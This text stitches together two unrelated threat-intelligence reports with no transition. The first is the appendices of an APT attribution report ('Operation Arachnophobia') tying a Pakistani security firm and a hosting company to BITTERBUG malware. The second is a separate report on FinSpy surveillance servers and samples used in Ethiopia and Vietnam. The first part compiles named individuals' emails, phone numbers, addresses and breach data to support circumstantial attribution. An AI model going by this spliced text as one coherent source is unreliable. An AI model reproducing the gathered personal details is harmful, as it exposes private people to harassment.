On August 15 , 2013 , Hamza Qamar ’s response to TCIRT ’s follow up inquiry to the observed inconsistencies redirected TCIRT
personnel to VPSNOC to obtain an explanation versus attempting to explain the observed day date inconsistency and document
properties within the Tranchulas email . The TCIRT ’s suspicion mounted when presenting Tranchulas with the opportunity to set the
record straight , that Tranchulas could not substantiate their claims , rather deferring the TCIRT inquiry to a third party ( VPSNOC ) .
Inconsistency # 4 : Tranchulas obtains similar response that TCIRT obtained
Within the “ Response_ThreatConnect.docx “ the image “ image1.png ” contains an undated response from VPSNOC to the
“ Tue , Jul 21 , 2013 ” Tranchulas notification . The undated VPSNOC response that Tranchulas received is nearly identical to the
response that TCIRT and the Kansas - City - based service provider obtained on July 24th . Tranchulas does not include the date or
time as to when they obtained a response from VPSNOC .
The TCIRT found it unusual that neither the Kansas - City - based service provider or VPSNOC personnel ever indicated either way
that they knew about the activity or had been previously contacted by either party . When considering all of the inconsistencies ,
order of events and studying , Gmail webmail layout , similarities of keywords , salutations and closings within the “ Tue , Jul 21 ,
2013 ” Tranchulas notification and the respective VPSNOC response . The TCIRT grew increasingly suspicious of the exchanges
with VPSNOC and subsequent exchanges with Tranchulas personnel .
Inconsistency # 5 : Similar Document Metadata Properties
Analysis of metadata within two benign decoy documents that were originally used within July 2013 BITTERBUG operations ,
Report.docx58 and Naxalites_Funded_by_Pakistan.docx59 , both maintained the author properties of “ hp ” . In reviewing the
document metadata within the “ Response_ThreatConnect.docx “ that was sent from Mr. Zubair Khan on August 6 , 2013 , the
TCIRT also identified that this document maintained the creator properties of “ hp . ” ( Figure 10 )
While the author field of “ hp ” does n’t conclusively prove a relationship , it contributes to a body of circumstantial evidence which
matches the document properties of the official Tranchulas response to the document properties that were also found within
decoy documents that were bundled with BITTERBUG implants .
58 	        https://www.virustotal.com/en/file/7e940115988d64fbf7cd3b0d86cd2440529f921790578a96acac4c027120e0c5/analysis/
59 	        https://www.virustotal.com/en/file/f689d9990a23fbde3b8688b30ff606da66021803390d0a48d02fad93dc11fa15/analysis/
22     •       OPERATION ARACHNOPHOBIA
APPENDIX E : VPSNOC & Digital Linx Associations
According to the vpsnoc.com website “ In 2007 five VPS experts decided to invest in their very own private rack space in the heart
of Kansas , the United States . Their aim ? To bring service - oriented , quality managed and unmanaged VPS solutions to clients
all over the world . Just 1 year later , after beginning their enterprise on 3 servers they had filled 2 server racks with happy clients
receiving quality U.S support . Their company continued to build momentum . ” 60
Whois records for vpsnoc.com indicate that another individual registered the domain and listed Digital Linx Hosting as the registrant
organization with a Kansas City - based address , telephone number 925 - 665 - 1427 , and administrative email address admin@digitallinx .
org.61 This is the same registrant record for the digitallinx.net domain.62 The digitallinx.net/sitemap.xml63 and the corresponding Google
cache64 for digitallinx.net/sitemap.xml indiciate that both digitallinx.net and digitallinx.com have shared the same sitemap.xml at the same
time . The digitallinx.net/Contact.html65 identified similar overlaps with data across the .org , .net , and .com domains .
The domain digitallinx.com is registered to Perasona # 1.66 67 68 69 He uses email addresses naseer@digitallinx.com and nbhatti@
gmail.com as the domain registrant email address , along with address 638-F Johar Town , Lahore Pakistan and telephone
966.548805579.70 The DigitalLinx ( digitallinx.com ) website states that it is “ a web hosting / Web Solutions & Processing
Outsourcing Company based in Pakistan ” .
Open source research of the phone number 925 - 665 - 1427 indicates that it is also used within site content as a phone number for
defiantmarketing.com . This domain is registered by Persona # 2 71 who uses the aliases “ agnosticon ” and “ agnostic ” . Persona # 2 lists VPSNOC
as the registrant organization , and uses the registration email address of abunasar@yahoo.com with an address of House 12 , Street 21 , F-8/1
Islamabad Federal 44000 . The domain defiantmarketing.com domain has used ns1.abunasar.net and ns2.abunasar.net for name services .
Within a January 2009 posting to a Debian users forum , Persona # 2 sends an email from the abunasar@yahoo.com with a reply - to as
abunasar@army.com.72 Within the post , Persona # 2 responds to the question “ Who ’s using Debian ” listing DigitalLinx , Kansas City MO and
the link to digitallinx.com . Also , the seemingly abandoned Twitter profile for Persona # 273 is only following the Twitter profile for @VPSNOC.74
In an April 2012 post to blackhatworld.com , a user with the alias “ agnosticon ” posted promotional codes for VPSNOC hosting
services , engaging with customers , providing them feedback regarding VPS services and thanking them for positive reviews.75
Within the posting the user “ agnosticon ” included an image which was an actual advertisement that was hosted at http://vpsnoc .
com / order.png.76 77 Within the posted image it states “ VPSNOC is a subdivision of Digital Linx Hosting . We have been in business since
2008 ” . The posting concludes with “ If you have any further questions / queries please contact us directly at : support@vpsnoc.com ”
60 	        http://vpsnoc.com
61 	        https://whois.domaintools.com/vpsnoc.com
62 	        https://whois.domaintools.com/digitallinx.net
63 	        digitallinx.net/sitemap.xml
64 	        http://webcache.googleusercontent.com/search?q=cache:CtCiQUGgUaoJ:www.digitallinx.net/sitemap.xml+&cd=1&hl=en&ct=clnk&gl=us
65 	        digitallinx.net/Contact.html
66 	        https://whois.domaintools.com/digitallinx.com
67 	        http://sa.linkedin.com/pub/muhammad-naseer-bhatti/9/18a/815
68 	        https://groups.google.com/forum/#!original/securityfocus2/9325p2as3IU/BqKQJwdlZ4YJ
69 	        Appendix F : Personas ; Persona # 1 Muhammad Naseer Bhatti
70 	        https://github.com/digitallinx/vBilling/blob/master/CHANGELOG
71 	        Appendix F : Personas ; Persona # 2 Abunasar Khan
72 	        https://lists.debian.org/debian-www/2009/01/msg00186.html
73 	        https://twitter.com/abunasar
74 	        https://twitter.com/vpsnoc
75 	        http://www.blackhatworld.com/blackhat-seo/members/32481-agnosticon.html
76 	        http://www.blackhatworld.com/blackhat-seo/hosting/430705-unmetered-vps-hosting-get-50-off-your-first-month-exclusive-coupons-bhw.html
77 	        http://vpsnoc.com/order.png
23     •       OPERATION ARACHNOPHOBIA
APPENDIX F : Personas
Persona # 1 :
Muhammad Naseer Bhatti ’s LinkedIn profile indicates that he is currently the founder for Digital Linx LLC and vBilling ( vbilling.org )
as well as a consultant for a U.S. company78 . Both Bhatti and Digital Linx are listed as the registrants for vbilling.org79 , v - billing .
com80 , vgriffins.com81 and my-server.co82 , which use P.O. Box 295658 , Riyadh Saudi Arabia83 as the registration address . This
is also the address for two U.S. companies’ local operations . Bhatti is also listed as the owner of the netblock 46.4.139.224/28 .
Both passive DNS sources as well as Robtex84 highlight this overlapping infrastructure.85
From September 7 - 9 , 2011 , Tranchulas in cooperation with the Pakistan National University of Sciences and Technology86
( NUST ) , offered a Certified Penetration Testing Profession ( CPTP ) Workshop87 ( Figure 17 ) . During the workshop , basic penetration
techniques and skills were presented88 . It is likely that CPTP workshops and alignment with NUST have allowed Tranchulas the
opportunity to recruit student interns.89
78 	        http://sa.linkedin.com/pub/muhammad-naseer-bhatti/9/18a/815
79 	        http://whois.domaintools.com/vbilling.org
80 	        http://whois.domaintools.com/v-billing.com
81 	        http://whois.domaintools.com/vgriffins.com
82 	        http://whois.domaintools.com/my-server.co
83 	        http://saudi.emc.com/contact/contact-us.htm
84 	        https://www.robtex.com/dns/digitallinx.com.html
85 	        http://whatmyip.co/info/whois/46.4.139.225
86 	 www.nust.edu.pk
87 	        http://seecs.nust.edu.pk/Seminars_workshops/pages/tranchulas_hacking_workshop/index.php
88 	        Digital Appendix 1 : Research Collateral ( Program.pdf )
89 	        http://www.nust.edu.pk/INSTITUTIONS/Directortes/ilo/Download%20Section/Graduate%20Profiles%20booklet-%202013%20(SEECS).pdf
24     •       OPERATION ARACHNOPHOBIA
Figure 17 : Muhammad Nasser Tranchulas CPTP Registration Point of Contact
Within the CPTP event registration contact information for Muhammad Naseer was listed next to a Tranchulas office number ( 051-
2871433)90 . It is important to note that Muhammad Naseer Bhatti has been previously known to drop91 the family name “ Bhatti ”
90 	        http://www.linkedin.com/groups/Tranchulas-Handson-Ethical-Hacking-Training-2616369.S.75237952
91 	        https://groups.google.com/forum/#!original/securityfocus2/9325p2as3IU/BqKQJwdlZ4YJ
25     •       OPERATION ARACHNOPHOBIA
within online correspondence ( Figure 18 ) . In a June 2012 episode of Engineering and Technology Magazine92 podcast a Mohammed
Nasser , Penetration Tester at Tranchulas was interviewed93 . A Mohammed Nasser may also be directly affiliated94 with Tranchulas .
Figure 18 : Muhammad Nasser Bhatti Dropping Family Name
This links Tranchulas to a Pakistani employee or consultant also named Muhammad Naseer . It is unknown if this is the same
Muhammad Naseer that is associated with VPSNOC ’s parent company Digital Linx , the Pakistan - based service provider which
hosted the original BITTERBUG malware .
92 	        http://eandt.theiet.org/magazine/2012/06/
93 	        http://eandt.theiet.org/magazine/2012/06/et-podcast-18.cfm
94 	        http://www.zoominfo.com/s/#!search/profile/person?personId=1627460418&targetid=profile
26     •       OPERATION ARACHNOPHOBIA
Persona # 2 :
Abunasar Khan also maintains the aliases “ agnosticon”95 and “ agnostic”96 in addition to the email addresses abunasar@yahoo .
com and abunasar@army.com . He has been previously associated97with VPSNOC & Digital Linx . An April 2012 Whois registrant
record for the domain zeusadnetwork.com98 includes the first and last name Khan along with the same ( 925 ) 665 - 1427 phone
number seen within the Digial Linx Hosting domains .
Khan registered a variety of domains , many of which use his abunasar.net99 for name services and abunasar.yahoo.com within
the Start of Authority ( SOA ) records . For example a July 2014 record ( Figure 19 ) for defiantmarketing.com100 and an August 2013
record ( Figure 20 ) for ns2.vpsnoc.com both maintain these references .
Figure 19 : SOA record for defiantmarketing.com ( July 2014 )
95 	         http://www.blackhatworld.com/blackhat-seo/members/32481-agnosticon.html
96 	         http://www.redlinegti.com/forum/viewtopic.php?f=3&t=41719&p=401115
97 	         http://www.webhostingtalk.com/showthread.php?t=723658
98 	         http://whois.domaintools.com/zeusadnetwork.com
99 	         http://whois.domaintools.com/abunasar.net
100 	        http://bgp.he.net/dns/defiantmarketing.com
27      •       OPERATION ARACHNOPHOBIA
Figure 20 : SOA Record for vpsnoc.com ( August 2013 )
Abunasar Khan registered abunasar.net and previously ( May 2007 ) and maintained whitehate.org101 , which have both been used
to demonstrate an affinity for and alignment with AntiSec and Anonymous movements.102 The abunasar.net website prominently
displays ascii art of the term “ antisec ” with antisec related content “ Blend in . Get trusted . Trust nobody . Own everybody . Disclose
nothing . Destroy everything . Take back the scene . ” This is a shared affinity that is also reflected amongst with the culture of
Tranchulas employees.103 104 105 The pure.whitehate.org domain has also been previously associated with Khan , examples can be
found within # phrack and # darknet IRC sessions.106 107
Ironically , in February 2011 , Khan ’s Rootkit.com user profile was compromised revealing his profile ’s username , password hash ,
email ( abunasar@army.com ) , and the registration IP address of 202.125.143.67 ( Islamabad , Pakistan).108 During his registration ,
Khan specified the name “ anony mo us ” when registering the profile . As of 16 August 2013 , a Pastebin post contained details of
a customer database compromise for nowclothing.pk , which included Khan ’s name , email abunasar@army.com , and cell phone
number 03215488881.109 110
Research of the 03215488881 cell phone number yields a user profile “ abunasark ” in an April 2009 posting.111 Khan posts
pictures of his blue Baleno and includes another phone number 03234764838.112 In a secondary profile user “ Ak ” uses the same
cell phone number 03215488881 in a 2009 sales posting for a 2004 blue Baleno.113 114
101 	        https://whois.domaintools.com/whitehate.org
102 	        https://whois.domaintools.com/abunasar.net
103 	        https://www.facebook.com/media/set/?set=a.542485719112184.135023.132987340062026&type=3
104 	        http://youtube.com/watch?v=w3DjOuEI0vs.mov
105 	        Digital Appendix 3 : Screenshot Archives ( youtube.com/watch?v=w3DjOuEI0vs.mov )
106 	        http://pastebin.com/rqVGqh1q
107 	        http://shootingsawk.lescigales.org/misc/owneddarknet.txt
108 	        https://dazzlepod.com/rootkit/?page=284
109 	        http://pastebin.com/ktR3qM3K
110 	        Digital Appendix 3 : Screenshot Archives ( pastebin.com/ktR3qM3K.png )
111 	        http://www.pakwheels.com/forums/user/abunasark
112 	        http://www.pakwheels.com/forums/members-member-rides/99428-white-baleno-not-anymore-comments-please-p-4
113 	        http://www.motors.pk/ak-22.htm
114 	        http://www.motors.pk/used-cars/suzuki-baleno-2004-for-sale-in-islamabad-22.htm
28      •       OPERATION ARACHNOPHOBIA
Khan ’s affinity for Suzuki Baleno cars is made obvious in a May 2009 registration for clubaleno.co.uk that was registered by Khan
at VPSNOC using the name services of ns1.abunasar.net and ns2.abunasar.net with a SOA record of abunasar.yahoo.com.115 116
Later in a June 2009 posting , Khan using the alias “ agnostic ” attempts to sell the domain clubaleno.co.uk and uses his abunasar@
army.com email address as a point of contact.117
Khan is also observed using the alias “ agnosticon ” and a Toyota Racing Development avitar within posts to blackhatworld.com
and again within a 2011 post where he posts a cpanel error that also includes his “ abunasar ” username within system output.118
The Google+ profile for Khan119 reveals established social network links to a Team Lead for Penetration Testing at Tranchulas and
a Digital Linx employee Shoaib Riaz120 who also maintains a social network association with the Digital Linx founder Muhammad
Nasser Bhatti.121
115 	        http://www.sitetrail.com/clubaleno.co.uk
116 	        http://dawhois.com/site/clubaleno.co.uk.html
117 	        http://www.redlinegti.com/forum/viewtopic.php?f=3&t=41719&p=401115
118 	        http://forums.cpanel.net/f5/help-yum-broke-rpm-db-broke-somehow-httpd-wont-start-238511.html
119 	        https://plus.google.com/103436628630566104748/posts
120 	        https://plus.google.com/105059395104464629441/about
121 	        https://plus.google.com/105855064276291727409/posts
29      •       OPERATION ARACHNOPHOBIA
APPENDIX G : Tranchulas
The Tranchulas website122 states that they provide a range of security services and training to include penetration and offensive
cyber initiative ( OCI ) , in which they “ help national level cyber security programs on strategies for managing offensive technical
threats ” . In a September 2011 YouTube user “ tranchulascert ” posted a video titled “ Tranchulas Cyber Ranges - P@sha ICT Awards
2011123 ” , where they awarded runner up124 . Within the video , the cyber ranges were referenced as being developed for “ defense
forces ” that were aimed to “ help them in developing offensive and defensive warfare skills ” and “ combating anti - state hackers ” .
Although Tranchulas125 brands itself as a multi - national company , their respective operating addresses within United Kingdom126
the United States127 and New Zealand128 are all associated with either virtual office spaces or address forwarding services . The
Tranchulas website lists its Pakistan address within the 2nd floor of the Evacuee Trust Complex129 on Sir Agha Khan Road F-5/1
Islamabad 44000 . The Evacuee Trust Complex is also known as Software Technology Park 2130 or STP2 and hosts a variety131 of
other commercial and government offices .
The Tranchulas employee , Hamza Qamar , that handled the response to our inquiry has a public LinkedIn132 profile that states that
he “ Engaged in system and enterprise level network and Web application security testing for clients ranging from large federal
agencies , DoD , and commercial clients . ” The profile does not specify if DoD is a reference to the U.S. Department of Defense or
another country ’s Ministry of Defense . Interestingly , Qamar ’s Google+ page showed one “ friend ” in his circle despite more than 40
followers , Abunasar Khan a VPSNOC employee .
It is likely that Tranchulas provides services to the Pakistani government . The offensive cyber initiative services offered by
Tranchulas is offered to “ national - level cyber security programs ” suggesting a commercial demand from “ national - level ” customers .
The stated purpose and intent of the Tranchulas “ Cyber Ranges ” P@sha ICT 2011 awards video suggests the ranges were
specifically developed in support of national interests for offensive and defensive purposes . The domain registration by Zubair
Khan using an official Pakistani government address with his zubair@tranchulas.com email address indicates that Khan may have
or currently maintains a physical address at a location where other Pakistani government officials reside .
Historic Whois registration records for the domains textcrypter.com133 , taggnation.com134 , bookadoconline.com135 and saadiakhan .
net136 lists Tranchulas CEO Zubair Khan ( zubair@tranchulas.com137 ) as the registrant for the domains . At the time of registration
Khan used the address 15-B , Mehran Block of the Gulshan - e - Jinnah F-5/1 Islamabad Pakistan for the domains .
122 	    http://tranchulas.com
123 	    https://www.youtube.com/watch?v=FAM6JxOHdo8
124 	    http://pashaictawards.com/?page_id=1644
125 	    http://tranchulas.com/contact-us/
126 	    http://www.londonpresence.com/contact-us/
127 	    http://nextspace.us/nextspace-union-square-san-francisco/
128 	    http://www.privatebox.co.nz/virtual-office/virtual-office-address.php
129 	    https://www.facebook.com/EvacueeTrustComplex
130 	    http://wikimapia.org/425791/Evacuee-Trust-Complex
131 	    https://www.facebook.com/EvacueeTrustComplex/photos/a.554791821273808.1073741825.404981572921501/554791824607141/
132 	    http://pk.linkedin.com/pub/hamza-qamar/22/6b8/109
133 	    https://whois.domaintools.com/textcrypter.com
134 	    https://whois.domaintools.com/taggnation.com
135 	    https://whois.domaintools.com/bookadoconline.com
136 	    https://whois.domaintools.com/saadiakhan.net
137 	    https://reversewhois.domaintools.com/?email=b249ca637ef7cc55a0136bcda9dca0d3
30      •    OPERATION ARACHNOPHOBIA
In an April 2008 Request for Proposals , the Pakistan Public Works Department issued a tender138 for the Constriction of
Government Servant Quarters and Garages at Gulshan - e - Jinnah Complex F-5/1 Islamabad . Later in May of 2010 within a
Pakistani Senate139 question and answer session , the Gulshan - e - Jinnah Complex was cited under Federal Lodges / Hostels in
Islamabad under the control of Pakistan Ministry for Housing and Works . A December 2010 TheNews Pakistan ran a story140
that detailed the differential in rents between commoners within Islamabad and Pakistani government officers accommodated
at Gulshan - e - Jinnah . According to Google Maps141 it is approximately 650 meters ( 8 minute walk ) from the Gulshan - e - Jinnah
Complex to the Tranchulas offices within the Evacuee Trust Complex .
Within a May 2013 interview142 Khan specified that he comes from a family with a strong military background . He detailed his
interest in “ the world of hacking ” grew during his teen years , referencing his father ’s diplomatic assignment to the Philippines in
2003 . Khan would go on to establish Tranchulas in February 2006 after an independent audit of Pakistani Governments National
Database and Registration Authority ( NADRA ) .
138 	        http://www.dgmarket.com/tenders/np-notice.do?noticeId=2466880
139 	        http://www.senate.gov.pk/uploads/documents/questions/1317711132_399.pdf
140 	        http://www.thenews.com.pk/Todays-News-2-22150-Bureaucrats-journalists-avail-cheaper-accommodation
141 	 https://www.google.com / maps / dir / Tranchulas,+Islamabad,+Pakistan / Gulshan - e - Jinnah+Complex,+Islamabad,+Pakistan/@33.7327466,7
3.0877996,17z / data=!4m13!4m12!1m5!1m1!1s0x38dfc0820ff3f9e3:0x4b3eb557d9cd81c3!2m2!1d73.088686!2d33.73353!1m5!1m1!1s0
x38dfc0818a64f1d7:0x82c3bee2d49d88ab!2m2!1d73.089409!2d33.73263?hl = en - US
142 	        http://bluechipmag.com/qa-with-zubair-khan/
31      •      OPERATION ARACHNOPHOBIA
Digital Appendix 1 : Research Collateral
Digital Appendix 1 contains additional research collateral collected when conducting Operation Arachnophobia research .
32    •    OPERATION ARACHNOPHOBIA
Digital Appendix 2 : Raw Email Communications
Digital Appendix 2 contains raw email communications . These .eml files include raw SMTP headers , content and attachments .
33    •    OPERATION ARACHNOPHOBIA
Digital Appendix 3 : Screenshot Archives
Digital Appendix 3 contains screenshots of web content used to conduct analysis .
34    •    OPERATION ARACHNOPHOBIA
Digital Appendix 4 : Maltego Visualization
Digital Appendix 4 contains visualization files that depict relationships and contain metadata associated with our Operation
Arachnophobia research .
35    •     OPERATION ARACHNOPHOBIA

This post describes the results of a comprehensive global Internet scan for the command and control servers of FinFisher 's surveillance software .
It also details the discovery of a campaign using FinFisher in Ethiopia used to target individuals linked to an opposition group .
Additionally , it provides examination of a FinSpy Mobile sample found in the wild , which appears to have been used in Vietnam .
- We have found command and control servers for FinSpy backdoors , part of Gamma International 's FinFisher `` remote monitoring solution , '' in a total of 25 countries : Australia , Bahrain , Bangladesh , Brunei , Canada , Czech Republic , Estonia , Ethiopia , Germany , India , Indonesia , Japan , Latvia , Malaysia , Mexico , Mongolia , Netherlands , Qatar , Serbia , Singapore , Turkmenistan , United Arab Emirates , United Kingdom , United States , Vietnam .
- A FinSpy campaign in Ethiopia uses pictures of Ginbot 7 , an Ethiopian opposition group , as bait to infect users .
This continues the theme of FinSpy deployments with strong indications of politically - motivated targeting .
- There is strong evidence of a Vietnamese FinSpy Mobile Campaign .
We found an Android FinSpy Mobile sample in the wild with a command & control server in Vietnam that also exfiltrates text messages to a local phone number .
- These findings call into question claims by Gamma International that previously reported servers were not part of their product line , and that previously discovered copies of their software were either stolen or demo copies .
FinFisher is a line of remote intrusion and surveillance software developed by Munich - based Gamma International GmbH .
FinFisher products are marketed and sold exclusively to law enforcement and intelligence agencies by the UK - based Gamma Group .
Although touted as a `` lawful interception '' suite for monitoring criminals , FinFisher has gained notoriety because it has been used in targeted attacks against human rights campaigners and opposition activists in countries with questionable human rights records .
In late July 2012 , we published the results of an investigation into a suspicious e - mail campaign targeting Bahraini activists .
We analyzed the attachments and discovered that they contained the FinSpy spyware , FinFisher 's remote monitoring product .
FinSpy captures information from an infected computer , such as passwords and Skype calls , and sends the information to a FinSpy command & control ( C2 ) server .
The attachments we analyzed sent data to a command & control server inside Bahrain .
This discovery motivated researchers to search for other command & control servers to understand how widely FinFisher might be used .
Claudio Guarnieri at Rapid7 ( one of the authors of this report ) was the first to search for these servers .
He fingerprinted the Bahrain server and looked at historical Internet scanning data to identify other servers around the world that responded to the same fingerprint .
Rapid7 published this list of servers , and described their fingerprinting technique .
Other groups , including CrowdStrike and SpiderLabs also analyzed and published reports on FinSpy .
Immediately after publication , the servers were apparently updated to evade detection by the Rapid7 fingerprint .
We devised a different fingerprinting technique and scanned portions of the internet .
We confirmed Rapid7 's results , and also found several new servers , including one inside Turkmenistan 's Ministry of Communications .
We published our list of servers in late August 2012 , in addition to an analysis of mobile phone versions of FinSpy .
FinSpy servers were apparently updated again in October 2012 to disable this newer fingerprinting technique , although it was never publicly described .
Nevertheless , via analysis of existing samples and observation of command & control servers , we managed to enumerate yet more fingerprinting methods and continue our survey of the internet for this surveillance software .
We describe the results in this post .
Civil society groups have found cause for concern in these findings , as they indicate the use of FinFisher products by countries like Turkmenistan and Bahrain with problematic records on human rights , transparency , and rule of law .
In an August 2012 response to a letter from UK - based NGO Privacy International , the UK Government revealed that at some unspecified time in the past , it had examined a version of FinSpy , and communicated to Gamma that a license would be required to export that version outside of the EU .
Gamma has repeatedly denied links to spyware and servers uncovered by our research , claiming that the servers detected by our scans are `` not … from the FinFisher product line .
'' Gamma also claims that the spyware sent to activists in Bahrain was an `` old '' demonstration version of FinSpy , stolen during a product presentation .
In February 2013 , Privacy International , the European Centre for Constitutional and Human Rights ( ECCHR ) , the Bahrain Center for Human Rights , Bahrain Watch , and Reporters Without Borders filed a complaint with the Organization for Economic Cooperation and Development ( OECD ) , requesting that this body investigate whether Gamma violated OECD Guidelines for Multinational Enterprises by exporting FinSpy to Bahrain .
The complaint called previous Gamma statements into question , noting that at least two different versions ( 4.00 and 4.01 ) of FinSpy were found in Bahrain , and that Bahrain 's server was a FinFisher product and was likely receiving updates from Gamma .
This complaint , as laid out by Privacy International states that Gamma : - failed to respect the internationally recognised human rights of those affected by [ its ] activities - caused and contributed to adverse human rights impacts in the course of [ its ] business activities - failed to prevent and mitigate adverse human rights impacts linked to [ its ] activities and products , and failed to address such impacts where they have occurred - failed to carry out adequate due diligence ( including human rights due diligence ) ; and - failed to implement a policy commitment to respect human rights .
According to recent reporting , German Federal Police appear to have plans to purchase and use the FinFisher suite of tools domestically within Germany .
Meanwhile , findings by our group and others continue to illustrate the global proliferation of FinFisher 's products .
Research continues to uncover troubling cases of FinSpy in countries with dismal human rights track records , and politically repressive regimes .
Most recently , work by Bahrain Watch has confirmed the presence of a Bahraini FinFisher campaign , and further contradicted Gamma 's public statements .
This post adds to the list by providing an updated list of FinSpy Command & Control servers , and describing the FinSpy malware samples in the wild which appear to have been used to target victims in Ethiopia and Vietnam .
We present these updated findings in the hopes that we will further encourage civil society groups and competent investigative bodies to continue their scrutiny of Gamma 's activities , relevant export control issues , and the issue of the global and unregulated proliferation of surveillance malware .
Around October 2012 , we observed that the behavior of FinSpy servers began to change .
Servers stopped responding to our fingerprint , which had exploited a quirk in the distinctive FinSpy wire protocol .
We believe that this indicates that Gamma either independently changed the FinSpy protocol , or was able to determine key elements of our fingerprint , although it has never been publicly revealed .
In the wake of this apparent update to FinSpy command & control servers , we devised a new fingerprint and conducted a scan of the internet for FinSpy command & control servers .
This scan took roughly two months and involved sending more than 12 billion packets .
Our new scan identified a total of 36 FinSpy servers , 30 of which were new and 6 of which we had found during previous scanning .
The servers operated in 19 different countries .
Among the FinSpy servers we found , 7 were in countries we had n't seen before .
New Countries : Canada , Bangladesh , India , Malaysia , Mexico , Serbia , Vietnam In our most recent scan , 16 servers that we had previously found did not show up .
We suspect that after our earlier scans were published the operators moved them .
Many of these servers were shut down or relocated after the publication of previous results , but before the apparent October 2012 update .
We no longer found FinSpy servers in 4 countries where previous scanning identified them ( Brunei , UAE , Latvia , and Mongolia ) .
Taken together , FinSpy servers are currently , or have been present , in 25 countries : Australia , Bahrain , Bangladesh , Brunei , Canada , Czech Republic , Estonia , Ethiopia , Germany , India , Indonesia , Japan , Latvia , Malaysia , Mexico , Mongolia , Netherlands , Qatar , Serbia , Singapore , Turkmenistan , United Arab Emirates , United Kingdom , United States , Vietnam .
Importantly , we believe that our list of servers is incomplete due to the large diversity of ports used by FinSpy servers , as well as other efforts at concealment .
Moreover , discovery of a FinSpy command and control server in a given country is not a sufficient indicator to conclude the use of FinFisher by that country 's law enforcement or intelligence agencies .
In some cases , servers were found running on facilities provided by commercial hosting providers that could have been purchased by actors from any country .
The table below shows the FinSpy servers detected in our latest scan .
We list the full IP address of servers that have been previously publicly revealed .
For active servers that have not been publicly revealed , we list the first two octets only .
Releasing complete IP addresses in the past has not proved useful , as the servers are quickly shut down and relocated .
Several of these findings are especially noteworthy : - Eight servers are hosted by provider GPLHost in various countries ( Singapore , Malaysia , Australia , US ) .
However , we observed only six of these servers active at any given time , suggesting that some IP addresses may have changed during our scans .
- A server identified in Germany has the registrant `` Gamma International GmbH , '' and the contact person is listed as `` Martin Muench .
'' - There is a FinSpy server in an IP range registered to `` Verizon Wireless .
'' Verizon Wireless sells ranges of IP addresses to corporate customers , so this is not necessarily an indication that Verizon Wireless itself is operating the server , or that Verizon Wireless customers are being spied on .
- A server in Qatar that was previously detected by Rapid7 seems to be back online after being unresponsive during the last round of our scanning .
The server is located in a range of 16 addresses registered to `` Qtel – Corporate accounts – Government Relations .
'' The same block of 16 addresses also contains the website http : //qhotels.gov.qa/ .
We analyzed a recently acquired malware sample and identified it as FinSpy .
The malware uses images of members of the Ethiopian opposition group , Ginbot 7 , as bait .
The malware communicates with a FinSpy Command & Control server in Ethiopia , which was first identified by Rapid7 in August 2012 .
The server has been detected in every round of scanning , and remains operational at the time of this writing .
It can be found in the following address block run by Ethio Telecom , Ethiopia 's state - owned telecommunications provider : The server appears to be updated in a manner consistent with other servers , including servers in Bahrain and Turkmenistan .
The sample is similar to a previously analyzed sample of FinSpy malware sent to activists in Bahrain in 2012 .
Just like Bahraini samples , the malware relocates itself and drops a JPG image with the same filename as the sample when executed by an unsuspecting user .
This appears to be an attempt to trick the victim into believing the opened file is not malicious .
Here are a few key similarities between the samples : - The PE timestamp `` 2011 - 07 - 05 08:25:31 '' of the packer is exactly the same as the Bahraini sample .
- The following string ( found in a process infected with the malware ) , self - identifies the malware and is similar to strings found in the Bahraini samples : - - The samples share the same Bootkit , SHA-256 : ba21e452ee5ff3478f21b293a134b30ebf6b7f4ec03f8c8153202a740d7978b2 .
- The samples share the same driverw.sys file , SHA-256 : 62bde3bac3782d36f9f2e56db097a4672e70463e11971fad5de060b191efb196 .
In this case the picture contains photos of members of the Ethiopian opposition group , Ginbot 7 .
Controversially , Ginbot 7 was designated a terrorist group by the Ethiopian Government in 2011 .
The Committee to Protect Journalists ( CPJ ) and Human Rights Watch have both criticized this action , CPJ has pointed out that it is having a chilling effect on legitimate political reporting about the group and its leadership .
The existence of a FinSpy sample that contains Ethiopia - specific imagery , and that communicates with a still - active command & control server in Ethiopia strongly suggests that the Ethiopian Government is using FinSpy .
We recently obtained and analyzed a malware sample and identified it as FinSpy Mobile for Android .
The sample communicates with a command & control server in Vietnam , and exfiltrates text messages to a Vietnamese telephone number .
The FinFisher suite includes mobile phone versions of FinSpy for all major platforms including iOS , Android , Windows Mobile , Symbian and Blackberry .
Its features are broadly similar to the PC version of FinSpy identified in Bahrain , but it also contains mobile - specific features such as GPS tracking and functionality for silent ' spy ' calls to snoop on conversations near the phone .
An in - depth analysis of the FinSpy Mobile suite of backdoors was provided in an earlier blog post : The Smartphone Who Loved Me : FinFisher Goes Mobile ? The sample included a configuration file that indicates available functionality , and the options that have been enabled by those deploying it : Interestingly , the configuration file also specifies a Vietnamese phone number used for SMS based command and control : The command and control server is in a range provided by the CMC Telecom Infrastructure Company in Hanoi : This server was active until very recently and matched our signatures for a FinSpy command and control server .
Both the command & control server IP and the phone number used for text - message exfiltration are in Vietnam which indicates a domestic campaign .
This apparent FinSpy deployment in Vietnam is troubling in the context of recent threats against online free expression and activism .
In 2012 , Vietnam introduced new censorship laws amidst an ongoing harassment , intimidation , and detention campaign against of bloggers who spoke out against the regime .
This culminated in the trial of 17 bloggers , 14 of whom were recently convicted and sentenced to terms ranging from 3 to 13 years .
Companies selling surveillance and intrusion software commonly claim that their tools are only used to track criminals and terrorists .
FinFisher , VUPEN and Hacking Team have all used similar language .
Yet a growing body of evidence suggests that these tools are regularly obtained by countries where dissenting political activity and speech is criminalized .
Our findings highlight the increasing dissonance between Gamma 's public claims that FinSpy is used exclusively to track `` bad guys '' and the growing body of evidence suggesting that the tool has and continues to be used against opposition groups and human rights activists .
While our work highlights the human rights ramifications of the mis - use of this technology , it is clear that there are broader concerns .
A global and unregulated market for offensive digital tools potentially presents a novel risk to both national and corporate cyber - security .
On March 12th , US Director of National Intelligence James Clapper stated in his yearly congressional report on security threats : '' … companies develop and sell professional - quality technologies to support cyberoperations – often branding these tools as lawful - intercept or defensive security research products .
Foreign governments already use some of these tools to target U.S .
systems .
'' The unchecked global proliferation of products like FinFisher makes a strong case for policy debate about surveillance software and the commercialization of offensive cyber - capabilities .
Our latest findings give an updated look at the global proliferation of FinSpy .
We identified 36 active FinSpy command & control servers , including 30 previously - unknown servers .
Our list of servers is likely incomplete , as some FinSpy servers employ countermeasures to prevent detection .
Including servers discovered last year , we now count FinSpy servers in 25 countries , including countries with troubling human rights records .
This is indicative of a global trend towards the acquisition of offensive cyber - capabilities by non - democratic regimes from commercial Western companies .
The Vietnamese and Ethiopian FinSpy samples we identified warrant further investigation , especially given the poor human rights records of these countries .
